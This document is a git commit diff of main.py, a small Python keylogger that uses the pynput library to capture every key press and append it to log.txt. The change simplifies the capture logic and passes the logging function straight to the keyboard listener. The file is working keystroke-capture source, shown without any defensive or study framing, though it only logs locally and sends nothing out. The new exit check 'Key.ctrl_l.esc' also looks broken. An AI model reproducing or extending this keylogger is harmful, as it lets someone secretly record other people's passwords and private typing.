0201b59e93c12f5622b48f09591cfedb99f51e74
David Slaboň <slabon.david94@gmail.com>
2023-04-29 17:26:46 +0200

    Done

--- main.py
+++ main.py
@@ -1,48 +1,27 @@
 from pynput.keyboard import Key, Listener
 
-# count = 0
-keys = []
 
-
-def on_press(key):
-    # global keys, count
-    global keys
-
-    keys.append(key)
-    # count += 1
-    print("{0} pressed".format(key))
-
-    write_file(keys)
-    keys = []
-
-    # if count >= 10:
-    #     write_file(keys)
-    #     keys = []
-    #     count = 0
-
-
-def write_file(keys):
+def write_file(key):
     with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find(".space") > 0:
-                # print("neee")
-                f.write("\n")
-            elif k.find(".shift") > 0:
-                continue
-            elif k[:4] == "Key.":
-                # print("anoo")
-                # k.replace("Key.", " ")
-                f.write(" " + k[4:].upper() + " ")
+        k = str(key).replace("'", "")
+        if k.find(".space") > 0:
+            f.write("\n")
+        elif k.find(".shift") > 0:
+            pass
+        elif k[:4] == "Key.":
+            if k.find(".enter") > 0:
+                f.write(" " + k[4:].upper() + "\n")
             else:
-                f.write(k)
+                f.write(" " + k[4:].upper() + " ")
+        else:
+            f.write(k)
 
 
 def on_release(key):
-    if key == Key.esc:
+    if key == Key.ctrl_l.esc:
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(on_press=write_file, on_release=on_release) as listener:
     listener.join()
 
